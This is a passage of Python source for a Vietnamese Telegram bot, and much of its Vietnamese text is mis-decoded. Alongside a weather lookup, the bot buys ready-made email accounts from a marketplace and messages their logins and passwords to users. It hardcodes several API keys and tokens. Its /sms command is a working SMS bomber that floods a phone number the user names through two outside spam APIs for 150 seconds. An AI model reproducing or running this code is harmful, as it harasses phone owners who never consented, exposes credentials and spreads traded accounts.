Hy v·ªçng b·∫°n s·∫Ω c√≥ kho·∫£ng th·ªùi gian vui v·∫ª ·ªü ƒë√¢y!
Nh·∫≠p /help ƒë·ªÉ xem danh s√°ch l·ªánh !!!
C√≥ v·∫•n ƒë·ªÅ g√¨ hay mua VIP li√™n h·ªá ADMIN !!!
ZALO: https://tinyurl.com/2y79qkkp
</blockquote>
        '''
          # URL c·ªßa video ch√†o m·ª´ng
        video_url = "https://files.catbox.moe/0m6k6z.mp4"
        bot.send_video(message.chat.id, video_url, parse_mode='HTML')


        # G·ª≠i tin nh·∫Øn ch√†o m·ª´ng
        bot.send_message(message.chat.id, welcome_text, parse_mode='HTML')

import cohere
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

GOOGLE_MAPS_URL = "https://www.google.com/maps/search/?api=1&query="
WEATHER_API_KEY = "03e4e3da0c689afa7f351d7972f48ffb"
COHERE_API_KEY = '7AlG9exDo3m1YVlhc3ow8Zu1lYi8EtcjXfEE5mgE'
co = cohere.Client(COHERE_API_KEY)

def get_geocode(city_name):
    try:
        geocode_url = f"http://api.openweathermap.org/geo/1.0/direct?q={city_name}&limit=1&appid={WEATHER_API_KEY}"
        response = requests.get(geocode_url)
        data = response.json()
        if response.status_code == 200 and data:
            return data[0]['lat'], data[0]['lon']
        return None, None
    except Exception as e:
        logger.error(f"Error fetching geocode")
        return None, None

def get_weather_data(lat, lon):
    try:
        base_url = "http://api.openweathermap.org/data/2.5/weather?"
        complete_url = f"{base_url}appid={WEATHER_API_KEY}&lat={lat}&lon={lon}&units=metric"
        response = requests.get(complete_url)
        weather_data = response.json()
        return weather_data
    except Exception as e:
        logger.error(f"")
        return {}

def translate_weather_description(description):
    try:
        translator = Translator()
        return translator.translate(description, src='en', dest='vi').text
    except Exception as e:
        logger.error(f"Error translating description: {e}")
        return description

def format_weather_message(weather_data, city):
    try:
        if weather_data.get('cod') != 200:
            return f"Error: {weather_data.get('message', '‚ùå Kh√¥ng T√¨m Th·∫•y V·ªã Tr√≠')}"
        
        country = weather_data['sys']['country']
        lat = weather_data['coord']['lat']
        lon = weather_data['coord']['lon']
        map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
        description = weather_data['weather'][0]['description']
        description_vn = translate_weather_description(description)
        
        temp = weather_data['main']['temp']
        feels_like = weather_data['main']['feels_like']
        temp_min = weather_data['main']['temp_min']
        temp_max = weather_data['main']['temp_max']
        
        pressure = weather_data['main']['pressure']
        humidity = weather_data['main']['humidity']
        cloudiness = weather_data['clouds']['all']
        wind_speed = weather_data['wind']['speed']
        wind_deg = weather_data['wind']['deg']

        uvi = None
        uvi_response = requests.get(f'https://api.openweathermap.org/data/2.5/uvi?lat={lat}&lon={lon}&appid={WEATHER_API_KEY}')
        if uvi_response.status_code == 200:
            uvi = uvi_response.json().get('value')

        aqi = None
        air_pollution_response = requests.get(f'http://api.openweathermap.org/data/2.5/air_pollution?lat={lat}&lon={lon}&appid={WEATHER_API_KEY}')
        if air_pollution_response.status_code == 200:
            aqi = air_pollution_response.json().get('list', [{}])[0].get('main', {}).get('aqi')

        precipitation = weather_data.get('rain', {}).get('1h', 0)
        precipitation_percentage = round(precipitation * 100, 2)  
        message = (
            f"<pre>"
            f"‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚≠ìTh·ªùi Ti·∫øt\n"
            f"‚îÇüîÜTh√¥ng Tin Th·ªùi Ti·∫øt ·ªü {city}\n"
            f"‚îÇüåç Th√†nh ph·ªë: {city}\n"
            f"‚îÇüîó Link b·∫£n ƒë·ªì: <a href='{map_link}'>Xem b·∫£n ƒë·ªì</a>\n"
            f"‚îÇ‚òÅÔ∏è Th·ªùi ti·∫øt: {description_vn}\n"
            f"‚îÇüå° Nhi·ªát ƒë·ªô hi·ªán t·∫°i: {temp}¬∞C\n"
            f"‚îÇüå°Ô∏è C·∫£m gi√°c nh∆∞: {feels_like}¬∞C\n"
            f"‚îÇüå°Ô∏è Nhi·ªát ƒë·ªô t·ªëi ƒëa: {temp_max}¬∞C\n"
            f"‚îÇüå°Ô∏è Nhi·ªát ƒë·ªô t·ªëi thi·ªÉu: {temp_min}¬∞C\n"
            f"‚îÇüçÉ √Åp su·∫•t: {pressure} hPa\n"
            f"‚îÇü´ß ƒê·ªô ·∫©m: {humidity}%\n"
            f"‚îÇ‚òÅÔ∏è M·ª©c ƒë·ªô m√¢y: {cloudiness}%\n"
            f"‚îÇüå¨Ô∏è T·ªëc ƒë·ªô gi√≥: {wind_speed} m/s\n"
            f"‚îÇüåê Qu·ªëc gia: {country}\n"
            f"‚îÇüå¨ H∆∞·ªõng gi√≥: {wind_deg}¬∞\n"
        )

        if uvi is not None:
            message += f"‚îÇ‚òÄÔ∏è Ch·ªâ s·ªë UV: {uvi}\n"
        if aqi is not None:
            message += f"‚îÇüè≠ Ch·∫•t l∆∞·ª£ng kh√¥ng kh√≠: {aqi}\n"
        if precipitation > 0:
            message += f"‚îÇüåß L∆∞·ª£ng m∆∞a: {precipitation} mm\n"
            message += f"‚îÇüåß Ph·∫ßn trƒÉm l∆∞·ª£ng m∆∞a: {precipitation_percentage}%\n"

        message += f"‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚≠ê</pre>\n"
        return message
    except KeyError as e:
        logger.error(f"Error formatting weather message: {e}")
        return f"‚ùå L·ªói Nghi√™m Tr·ªçng"

@bot.message_handler(commands=['thoitiet'])
def thoitiet(message):
    if not bot_active:
        bot.reply_to(message, text="ü§ñ VuThiHoa-BOT\nVuThiHoa ƒêang T·∫Øt Hi·ªán C√°c Th√†nh Vi√™n Kh√¥ng Th·ªÉ S·ª≠ D·ª•ng")
        return

    try:
        if len(message.text.split()[1:]) < 1:
            bot.reply_to(message, text="ü§ñ VuThiHoa-BOT\nü§ñ Usage: /thoitiet <T·ªânh Th√†nh>")
            return
        
        city_name = ' '.join(message.text.split()[1:]).strip()
        lat, lon = get_geocode(city_name)
        
        if lat is not None and lon is not None:
            weather_data = get_weather_data(lat, lon)
            weather_message = format_weather_message(weather_data, city_name)
        else:
            weather_message = "‚ùå Kh√¥ng th·ªÉ t√¨m th·∫•y t·ªça ƒë·ªô cho th√†nh ph·ªë n√†y. Vui l√≤ng ki·ªÉm tra l·∫°i t√™n th√†nh ph·ªë."

        bot.reply_to(message, text=weather_message, parse_mode='HTML')

    except Exception as e:
        logger.error(f"Hard Target: {e}")
        bot.reply_to(message, text="‚ùå L·ªói M√°y Ch·ªß")

# C·∫•u h√¨nh logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Th√¥ng tin token API
USER_TOKEN = "TNDCEA8RFAE8KY5OHW9WRFUM8IB44W50FC1Y"
KIOSK_TOKEN = "59FZGLNXP3W4AICQ99Q3"

class AccountManager:
    def __init__(self, userToken, kioskToken):
        self.userToken = userToken
        self.kioskToken = kioskToken

    # H√†m mua s·∫£n ph·∫©m
    def buy_account(self):
        try:
            url = f"https://taphoammo.net/api/buyProducts?kioskToken={self.kioskToken}&userToken={self.userToken}&quantity=1"
            response = requests.get(url)
            response.raise_for_status()
            data = response.json()
            if data.get("success") == "true":
                order_id = data.get("order_id")
                logger.info(f"‚úÖ Mua h√†ng th√†nh c√¥ng, Order ID: {order_id}")
                return order_id
            else:
                logger.error(f"‚ùå Mua h√†ng th·∫•t b·∫°i: {data.get('description', 'L·ªói kh√¥ng x√°c ƒë·ªãnh')}")
                return None
        except Exception as e:
            logger.error(f"‚ùå ƒê√£ x·∫£y ra l·ªói khi mua h√†ng: {str(e)}")
            return None

    # H√†m l·∫•y t√†i kho·∫£n ƒë√£ mua
    def get_account(self, order_id, max_attempts=5, wait_time=5):
        attempt = 0
        while attempt < max_attempts:
            try:
                url = f"https://taphoammo.net/api/getProducts?orderId={order_id}&userToken={self.userToken}"
                response = requests.get(url)
                response.raise_for_status()
                data = response.json()

                if data.get("success") == "true":
                    products = data.get("data", [])
                    if products:
                        return products[0]["product"]  # Tr·∫£ v·ªÅ t√†i kho·∫£n ƒë·∫ßu ti√™n
                elif "Order in processing" in data.get("description", ""):
                    logger.info(f"‚è≥ ƒê∆°n h√†ng {order_id} v·∫´n ƒëang ƒë∆∞·ª£c x·ª≠ l√Ω, th·ª≠ l·∫°i...")
                    time.sleep(wait_time)  # ƒê·ª£i m·ªôt ch√∫t tr∆∞·ªõc khi th·ª≠ l·∫°i
                else:
                    logger.error(f"‚ùå L·ªói l·∫•y t√†i kho·∫£n: {data.get('description', 'L·ªói kh√¥ng x√°c ƒë·ªãnh')}")
                    return None
            except Exception as e:
                logger.error(f"‚ùå ƒê√£ x·∫£y ra l·ªói khi l·∫•y t√†i kho·∫£n: {str(e)}")
                return None
            attempt += 1
        
        logger.error(f"‚ùå V∆∞·ª£t qu√° s·ªë l·∫ßn th·ª≠, kh√¥ng th·ªÉ l·∫•y t√†i kho·∫£n.")
        return None

# Kh·ªüi t·∫°o AccountManager
manager = AccountManager(USER_TOKEN, KIOSK_TOKEN)

# L∆∞u tr·ªØ c√°c key ƒë√£ t·∫°o
user_keys = {}

# H√†m t·∫°o key ng·∫Øn h∆°n
def generate_unique_key(user_id):
    now = datetime.now().strftime('%Y%m%d%H%M%S')  # D·∫•u th·ªùi gian ch√≠nh x√°c ƒë·∫øn t·ª´ng gi√¢y
    raw_key = f"{user_id}_{now}"
    unique_key = hashlib.md5(raw_key.encode()).hexdigest()[:10]  # L·∫•y 10 k√Ω t·ª± ƒë·∫ßu
    return unique_key

# L·ªánh /getkey_reg
@bot.message_handler(commands=['getkey_reg'])
def getkey_reg(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return

    user_id = str(message.from_user.id)
    unique_key = generate_unique_key(user_id)

    # L∆∞u key m·ªõi nh·∫•t cho ng∆∞·ªùi d√πng
    user_keys[user_id] = unique_key

    bot.reply_to(message, text='üîÑ VUI L√íNG ƒê·ª¢I TRONG GI√ÇY L√ÅT...')

    # R√∫t g·ªçn URL ch·ª©a key
    key_url = f"https://www.thengoc.x10.mx/?key={unique_key}"
    api_token = '678872637ebb6e7ecd0fcbb6'

    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api={api_token}&url={key_url}')
        url = response.json()

        if 'shortenedUrl' in url:
            url_key = url['shortenedUrl']
        else:
            bot.reply_to(message, '‚ùå Kh√¥ng t√¨m th·∫•y shortenedUrl trong ph·∫£n h·ªìi.')
            return

    except requests.RequestException as e:
        bot.reply_to(message, '‚ùå ƒê√£ x·∫£y ra l·ªói khi k·∫øt n·ªëi ƒë·∫øn API.')
        print(f"Request error: {e}")
        return

    text = f'''
- LINK L·∫§Y KEY REG C·ª¶A @{message.from_user.username} NG√ÄY {datetime.now().strftime('%d-%m-%Y %H:%M:%S')} L√Ä: {url_key} 
- KHI L·∫§Y KEY XONG, D√ôNG L·ªÜNH /key_reg <key> ƒê·ªÇ K√çCH HO·∫†T QUY·ªÄN S·ª¨ D·ª§NG REG.
    '''
    bot.reply_to(message, text)

# L·ªánh /key_reg
@bot.message_handler(commands=['key_reg'])
def key_reg(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, '‚ùå VUI L√íNG NH·∫¨P KEY. D√ôNG /key_reg <key>')
        return

    user_id = str(message.from_user.id)
    provided_key = message.text.split()[1]

    # Ki·ªÉm tra key c√≥ kh·ªõp v·ªõi key m·ªõi nh·∫•t ƒë√£ t·∫°o kh√¥ng
    if user_id in user_keys and user_keys[user_id] == provided_key:
        # T·∫°o file user_reg.txt n·∫øu ch∆∞a c√≥
        user_reg_file = './user_reg.txt'
        if not os.path.exists(user_reg_file):
            with open(user_reg_file, 'w') as f:
                pass  # T·∫°o file n·∫øu ch∆∞a c√≥

        # Ki·ªÉm tra n·∫øu UID ƒë√£ c√≥ trong user_reg.txt
        with open(user_reg_file, 'a+') as f:
            f.seek(0)
            existing_uids = f.read().splitlines()
            if user_id in existing_uids:
                bot.reply_to(message, '‚ùó UID C·ª¶A B·∫†N ƒê√É ƒê∆Ø·ª¢C K√çCH HO·∫†T TR∆Ø·ªöC ƒê√ì.')
                return
            else:
                # Th√™m UID v√†o user_reg.txt
                f.write(f'{user_id}\n')
                bot.reply_to(message, '‚òëÔ∏è KEY REG H·ª¢P L·ªÜ ‚òëÔ∏è. B·∫†N ƒê√É ƒê∆Ø·ª¢C PH√âP S·ª¨ D·ª§NG L·ªÜNH /reg.')

        # X√≥a key sau khi s·ª≠ d·ª•ng
        del user_keys[user_id]

    else:
        bot.reply_to(message, '‚ùå KEY KH√îNG H·ª¢P L·ªÜ HO·∫∂C ƒê√É H·∫æT H·∫†N. VUI L√íNG T·∫†O KEY M·ªöI.')

# L·ªánh /reg
@bot.message_handler(commands=['reg'])
def handle_reg(message):
    user_id = str(message.from_user.id)
    user_reg_file = './user_reg.txt'

    # Ki·ªÉm tra n·∫øu file user_reg.txt t·ªìn t·∫°i v√† UID c√≥ trong file
    if not os.path.exists(user_reg_file):
        bot.reply_to(message, '‚ùå B·∫°n ch∆∞a k√≠ch ho·∫°t quy·ªÅn s·ª≠ d·ª•ng l·ªánh. Vui l√≤ng d√πng /getkey_reg v√† /key_reg ƒë·ªÉ x√†i l·ªánh.')
        return

    with open(user_reg_file, 'r') as f:
        existing_uids = f.read().splitlines()
        if user_id not in existing_uids:
            bot.reply_to(message, '‚ùå B·∫°n ch∆∞a get key n√™n ko c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh. Vui l√≤ng d√πng /getkey_reg v√† /key_reg ƒë·ªÉ x√†i l·ªánh.')
            return

    bot.reply_to(message, "üîÑ ƒêang x·ª≠ l√Ω, vui l√≤ng ch·ªù...  t√†i kho·∫£n s·∫Ω g·ª≠i cho b·∫°n v√† tin nh·∫Øn.")

    try:
        # B∆∞·ªõc 1: Mua s·∫£n ph·∫©m
        order_id = manager.buy_account()
        if not order_id:
            bot.reply_to(message, "‚ùå B·∫°n vui l√≤ng nh·∫Øn tin ri√™ng cho Bot v√† x√†i l·ªánh /start r·ªìi quay l·∫°i nh√≥m ƒë·ªÉ x√†i l·ªánh /reg.")
            return

        # B∆∞·ªõc 2: L·∫•y t√†i kho·∫£n ƒë√£ mua
        account_data = manager.get_account(order_id)
        if account_data:
            account, password = account_data.split("|")

            # G·ª≠i th√¥ng tin ri√™ng cho ng∆∞·ªùi d√πng
            bot.send_message(
                chat_id=message.from_user.id,  # G·ª≠i tin nh·∫Øn ri√™ng t∆∞ qua user_id
                text=f"‚úÖ ƒê√¢y l√† t√†i kho·∫£n c·ªßa b·∫°n:\nL∆∞u √Ω kh√¥ng ƒë·ªïi m·∫≠t kh·∫©u mail v√¨ s·∫Ω g√¢y die mail\nüë§ **T√†i kho·∫£n:** `{account}`\nüîë **M·∫≠t kh·∫©u:** `{password}`",
                parse_mode="Markdown"
            )

            # X√≥a UID kh·ªèi file user_reg.txt sau khi s·ª≠ d·ª•ng l·ªánh /reg
            with open(user_reg_file, 'r') as f:
                lines = f.readlines()
            with open(user_reg_file, 'w') as f:
                for line in lines:
                    if line.strip() != user_id:
                        f.write(line)
        else:
            bot.reply_to(message, "‚ùå  C√≥ Th·ªÉ ƒêang L·ªói G√¨ ƒê√≥ B·∫°n X√†i T·∫°m L·ªánh /reg1 ƒêi.")
    except Exception as e:
        bot.reply_to(message, "‚ùå C√≥ Th·ªÉ ƒêang L·ªói G√¨ ƒê√≥ B·∫°n X√†i T·∫°m L·ªánh /reg1 ƒêi.")
        print(f"L·ªói: {e}")

# C·∫•u h√¨nh logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Th√¥ng tin token API
USER_TOKEN1 = "TNDCEA8RFAE8KY5OHW9WRFUM8IB44W50FC1Y"
KIOSK_TOKEN1 = "Z6UC3M428M637RN5ILJB"

class AccountManager:
    def __init__(self, userToken, kioskToken):
        self.userToken = userToken
        self.kioskToken = kioskToken

    # H√†m mua s·∫£n ph·∫©m
    def buy_account(self):
        try:
            url = f"https://taphoammo.net/api/buyProducts?kioskToken={self.kioskToken}&userToken={self.userToken}&quantity=1"
            response = requests.get(url)
            response.raise_for_status()
            data = response.json()
            if data.get("success") == "true":
                order_id = data.get("order_id")
                logger.info(f"‚úÖ Mua h√†ng th√†nh c√¥ng, Order ID: {order_id}")
                return order_id
            else:
                logger.error(f"‚ùå Mua h√†ng th·∫•t b·∫°i: {data.get('description', 'L·ªói kh√¥ng x√°c ƒë·ªãnh')}")
                return None
        except Exception as e:
            logger.error(f"‚ùå ƒê√£ x·∫£y ra l·ªói khi mua h√†ng: {str(e)}")
            return None

    # H√†m l·∫•y t√†i kho·∫£n ƒë√£ mua
    def get_account(self, order_id, max_attempts=5, wait_time=5):
        attempt = 0
        while attempt < max_attempts:
            try:
                url = f"https://taphoammo.net/api/getProducts?orderId={order_id}&userToken={self.userToken}"
                response = requests.get(url)
                response.raise_for_status()
                data = response.json()

                if data.get("success") == "true":
                    products = data.get("data", [])
                    if products:
                        return products[0]["product"]  # Tr·∫£ v·ªÅ t√†i kho·∫£n ƒë·∫ßu ti√™n
                elif "Order in processing" in data.get("description", ""):
                    logger.info(f"‚è≥ ƒê∆°n h√†ng {order_id} v·∫´n ƒëang ƒë∆∞·ª£c x·ª≠ l√Ω, th·ª≠ l·∫°i...")
                    time.sleep(wait_time)  # ƒê·ª£i m·ªôt ch√∫t tr∆∞·ªõc khi th·ª≠ l·∫°i
                else:
                    logger.error(f"‚ùå L·ªói l·∫•y t√†i kho·∫£n: {data.get('description', 'L·ªói kh√¥ng x√°c ƒë·ªãnh')}")
                    return None
            except Exception as e:
                logger.error(f"‚ùå ƒê√£ x·∫£y ra l·ªói khi l·∫•y t√†i kho·∫£n: {str(e)}")
                return None
            attempt += 1
        
        logger.error(f"‚ùå V∆∞·ª£t qu√° s·ªë l·∫ßn th·ª≠, kh√¥ng th·ªÉ l·∫•y t√†i kho·∫£n.")
        return None

# L·ªánh /reg
@bot.message_handler(commands=['reg1'])
def handle_reg1(message):
    user_id = str(message.from_user.id)
    user_reg_file = './user_reg.txt'

    # Ki·ªÉm tra n·∫øu file user_reg.txt t·ªìn t·∫°i v√† UID c√≥ trong file
    if not os.path.exists(user_reg_file):
        bot.reply_to(message, '‚ùå B·∫°n ch∆∞a k√≠ch ho·∫°t quy·ªÅn s·ª≠ d·ª•ng l·ªánh. Vui l√≤ng d√πng /getkey_reg v√† /key_reg ƒë·ªÉ x√†i l·ªánh.')
        return

    with open(user_reg_file, 'r') as f:
        existing_uids = f.read().splitlines()
        if user_id not in existing_uids:
            bot.reply_to(message, '‚ùå B·∫°n ch∆∞a get key n√™n ko c√≥  quy·ªÅn s·ª≠ d·ª•ng l·ªánh. Vui l√≤ng d√πng /getkey_reg v√† /key_reg ƒë·ªÉ x√†i l·ªánh.')
            return

    bot.reply_to(message, "üîÑ ƒêang x·ª≠ l√Ω, vui l√≤ng ch·ªù...  t√†i kho·∫£n s·∫Ω g·ª≠i cho b·∫°n v√† tin nh·∫Øn.")

    try:
        # B∆∞·ªõc 1: Mua s·∫£n ph·∫©m
        order_id = manager.buy_account()
        if not order_id:
            bot.reply_to(message, "‚ùå B·∫°n vui l√≤ng nh·∫Øn tin ri√™ng cho Bot v√† x√†i l·ªánh /start r·ªìi quay l·∫°i nh√≥m ƒë·ªÉ x√†i l·ªánh /reg.")
            return

        # B∆∞·ªõc 2: L·∫•y t√†i kho·∫£n ƒë√£ mua
        account_data = manager.get_account(order_id)
        if account_data:
            account, password = account_data.split("|")

            # G·ª≠i th√¥ng tin ri√™ng cho ng∆∞·ªùi d√πng
            bot.send_message(
                chat_id=message.from_user.id,  # G·ª≠i tin nh·∫Øn ri√™ng t∆∞ qua user_id
                text=f"‚úÖ ƒê√¢y l√† t√†i kho·∫£n c·ªßa b·∫°n:\nL∆∞u √Ω kh√¥ng ƒë·ªïi m·∫≠t kh·∫©u mail v√¨ s·∫Ω g√¢y die mail\nüë§ **T√†i kho·∫£n:** `{account}`\nüîë **M·∫≠t kh·∫©u:** `{password}`",
                parse_mode="Markdown"
            )

            # X√≥a UID kh·ªèi file user_reg.txt sau khi s·ª≠ d·ª•ng l·ªánh /reg
            with open(user_reg_file, 'r') as f:
                lines = f.readlines()
            with open(user_reg_file, 'w') as f:
                for line in lines:
                    if line.strip() != user_id:
                        f.write(line)
        else:
            bot.reply_to(message, "‚ùå  C√≥ Th·ªÉ ƒêang L·ªói G√¨ ƒê√≥ B·∫°n X√†i T·∫°m L·ªánh /reg1 ƒêi.")
    except Exception as e:
        bot.reply_to(message, "‚ùå  C√≥ Th·ªÉ ƒêang L·ªói G√¨ ƒê√≥ B·∫°n X√†i T·∫°m L·ªánh /reg1 ƒêi.")
        print(f"L·ªói: {e}")

# ƒê·∫£m b·∫£o file reg_VIP.txt t·ªìn t·∫°i
if not os.path.exists("./reg_VIP.txt"):
    open("./reg_VIP.txt", "w").close()

@bot.message_handler(commands=['regvip'])
def reg_vip(message):
    user_id = str(message.from_user.id)

    # Ki·ªÉm tra UID trong file reg_VIP.txt
    with open("./reg_VIP.txt", "r") as file:
        lines = file.readlines()

    matched_line = None
    for line in lines:
        if line.startswith(user_id):
            matched_line = line.strip()
            break

    if not matched_line:
        bot.reply_to(message, '‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh /regvip ho·∫∑c ƒë√£ h·∫øt l∆∞·ª£t s·ª≠ d·ª•ng. Vui l√≤ng li√™n h·ªá admin.')
        return

    _, usage_limit = matched_line.split("|")
    usage_limit = int(usage_limit)

    if usage_limit <= 0:
        bot.reply_to(message, '‚ùå B·∫°n ƒë√£ h·∫øt l∆∞·ª£t s·ª≠ d·ª•ng l·ªánh /regvip. Vui l√≤ng li√™n h·ªá admin.')
        return

    bot.reply_to(message, "üîÑ ƒêang x·ª≠ l√Ω, vui l√≤ng ch·ªù...")

    try:
        # Mua s·∫£n ph·∫©m
        order_id = manager.buy_account()
        if not order_id:
            bot.reply_to(message, "‚ùå Kh√¥ng l·∫•y th√†nh c√¥ng, vui l√≤ng th·ª≠ l·∫°i sau.")
            return

        # L·∫•y t√†i kho·∫£n ƒë√£ mua
        account_data = manager.get_account(order_id)
        if account_data:
            account, password = account_data.split("|")

            # G·ª≠i th√¥ng tin ri√™ng cho ng∆∞·ªùi d√πng
            bot.send_message(
                chat_id=message.from_user.id,  # G·ª≠i tin nh·∫Øn ri√™ng t∆∞ qua user_id
                text=f"‚úÖ ƒê√¢y l√† t√†i kho·∫£n c·ªßa b·∫°n:\nL∆∞u √Ω kh√¥ng ƒë·ªïi m·∫≠t kh·∫©u mail v√¨ s·∫Ω g√¢y die mail\nüë§ **T√†i kho·∫£n:** `{account}`\nüîë **M·∫≠t kh·∫©u:** `{password}`",
                parse_mode="Markdown"
            )

            # Gi·∫£m s·ªë l·∫ßn s·ª≠ d·ª•ng c√≤n l·∫°i v√† c·∫≠p nh·∫≠t file reg_VIP.txt
            updated_lines = []
            for line in lines:
                if line.strip() == matched_line:
                    updated_lines.append(f"{user_id}|{usage_limit - 1}\n")
                else:
                    updated_lines.append(line)

            with open("./reg_VIP.txt", "w") as file:
                file.writelines(updated_lines)

            bot.reply_to(message, f"‚úÖ B·∫°n ƒë√£ s·ª≠ d·ª•ng th√†nh c√¥ng, t√†i kho·∫£n s·∫Ω g·ª≠i cho b·∫°n v√† tin nh·∫Øn. S·ªë l·∫ßn c√≤n l·∫°i: {usage_limit - 1}")
        else:
            bot.reply_to(message, "‚ùå Kh√¥ng l·∫•y ƒë∆∞·ª£c t√†i kho·∫£n, vui l√≤ng th·ª≠ l·∫°i sau.")
    except Exception as e:
        bot.reply_to(message, "‚ùå ƒê√£ x·∫£y ra l·ªói. Vui l√≤ng th·ª≠ l·∫°i sau.")
        print(f"L·ªói: {e}")

last_sms_time = {}
active_sms_requests = {}  # L∆∞u tr·ªØ tr·∫°ng th√°i API ƒëang ho·∫°t ƒë·ªông
video_url = "https://files.catbox.moe/2vx7k6.mp4"
bot_active = True

@bot.message_handler(commands=["sms"])
def sms(message):
    global active_sms_requests

    if not bot_active:
        bot.reply_to(message, "ü§ñ Bot hi·ªán ƒëang t·∫Øt, vui l√≤ng th·ª≠ l·∫°i sau!")
        return

    user_id = message.from_user.id
    username = message.from_user.username or "Unknown User"
    args = message.text.split()[1:]

    if len(args) < 1:
        bot.reply_to(message, "ü§ñ S·ª≠ d·ª•ng: /sms <S·ªê ƒêI·ªÜN THO·∫†I>")
        return

    phone = args[0]

    # Ki·ªÉm tra cooldown n·∫øu kh√¥ng ph·∫£i admin
    if user_id not in ADMIN_ID:
        last_time = last_sms_time.get(user_id, 0)
        current_time = time.time()

        if current_time - last_time < 100:
            remaining_time = int(100 - (current_time - last_time))
            bot.reply_to(message, f"‚è≥ Vui l√≤ng ch·ªù {remaining_time} gi√¢y ƒë·ªÉ ti·∫øp t·ª•c!")
            return

        last_sms_time[user_id] = current_time

    # Ki·ªÉm tra xem s·ªë ƒëi·ªán tho·∫°i ƒë√£ ƒë∆∞·ª£c spam ch∆∞a
    if phone in active_sms_requests:
        bot.reply_to(message, f"‚ö†Ô∏è S·ªë {phone} ƒëang ƒë∆∞·ª£c spam. Vui l√≤ng th·ª≠ l·∫°i sau 150 gi√¢y!")
        return

    # URLs API spam
    url1 = f"http://160.191.245.126:5000/vsteam/api?key=tmrvirus-free&sdt={phone}"
    url2 = f"https://api.natnetwork.sbs/spamsms?phone={phone}&count=10"

    active_sms_requests[phone] = True

    bot.reply_to(message, f"üöÄ ƒêang b·∫Øt ƒë·∫ßu spam SMS cho s·ªë: {phone}. Qu√° tr√¨nh s·∫Ω di·ªÖn ra trong 150 gi√¢y.")
    threading.Thread(target=spam_sms, args=(phone, url1, url2, message, username)).start()

def spam_sms(phone, url1, url2, message, username):
    try:
        start_time = time.time()
        end_time = start_time + 150  # ƒê·∫∑t th·ªùi gian k·∫øt th√∫c l√† 150 gi√¢y
        video_sent = False  # ƒê·∫£m b·∫£o video ch·ªâ ƒë∆∞·ª£c g·ª≠i m·ªôt l·∫ßn

        while time.time() < end_time:
            api1_success, api2_success = False, False

            # G·ª≠i request ƒë·∫øn API 1 (kh√¥ng b√°o l·ªói n·∫øu l·ªói)
            try:
                response1 = requests.get(url1, timeout=10)
                if response1.status_code == 200 and response1.json().get('Status') == "[G∆ØÃâI T√ÇÃÅN C√îNG THAÃÄNH C√îNG SMS]":
                    api1_success = True
            except requests.exceptions.RequestException:
                pass  # API 1 l·ªói th√¨ b·ªè qua

            # G·ª≠i request ƒë·∫øn API 2 (kh√¥ng b√°o l·ªói n·∫øu l·ªói)
            try:
                response2 = requests.get(url2, timeout=10)
                if response2.status_code == 200:
                    api2_success = True
            except requests.exceptions.RequestException:
                pass  # API 2 l·ªói th√¨ b·ªè qua

            # N·∫øu c√≥ √≠t nh·∫•t m·ªôt API th√†nh c√¥ng v√† video ch∆∞a g·ª≠i, g·ª≠i video m·ªôt l·∫ßn
            if (api1_success or api2_success) and not video_sent:
                message_text = (f'''
> ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚≠ì SPAM SMS ‚≠ì‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
> ‚îÇ¬ª User: @{username} ƒë√£ g·ª≠i spam
> ‚îÇ¬ª Spam: Th√†nh C√¥ng [‚úì]
> ‚îÇ¬ª Phone: {phone}
> ‚îÇ¬ª Admin: Ngocdoian 
> ‚îÇ¬ª Telegram Admin: Ngocdoian
> ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[‚úì]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
''')
                # G·ª≠i video v·ªõi m·ªôt caption duy nh·∫•t
                bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')
                video_sent = True  # ƒê√°nh d·∫•u l√† ƒë√£ g·ª≠i video

            time.sleep(5)  # Ch·ªù 5 gi√¢y gi·ªØa m·ªói l·∫ßn g·ª≠i API

    finally:
        # X√≥a s·ªë ƒëi·ªán tho·∫°i kh·ªèi danh s√°ch ƒëang spam sau 150 gi√¢y
        if phone in active_sms_requests:
            del active_sms_requests[phone]


@bot.message_handler(commands=["down"])
def download_content(message):
    try:
        # Ki·ªÉm tra c√∫ ph√°p l·ªánh
        args = message.text.split(maxsplit=1)
        if len(args) != 2:
            bot.reply_to(message, "‚ùå Vui l√≤ng s·ª≠ d·ª•ng l·ªánh nh∆∞ sau: /down <link video>")
            return

        video_link = args[1].strip()
        api_url = f"https://keyherlyswar.x10.mx/Apidocs/downall.php?link={video_link}"
        response = requests.get(api_url)

        # Ki·ªÉm tra k·∫øt n·ªëi API
        if response.status_code != 200:
            bot.reply_to(message, "‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi t·ªõi API.")
            return

        data = response.json()

        # Ki·ªÉm tra d·ªØ li·ªáu tr·∫£ v·ªÅ
        if not data or data.get("error"):
            bot.reply_to(message, "‚ùå Kh√¥ng t√¨m th·∫•y th√¥ng tin t·ª´ link ƒë√£ nh·∫≠p.")
            return

        # L·∫•y th√¥ng tin t·ª´ API
        title = data["data"].get("title", "Kh√¥ng x√°c ƒë·ªãnh")
        author = data["data"].get("author", "Kh√¥ng x√°c ƒë·ªãnh")
        medias = data["data"].get("medias", [])

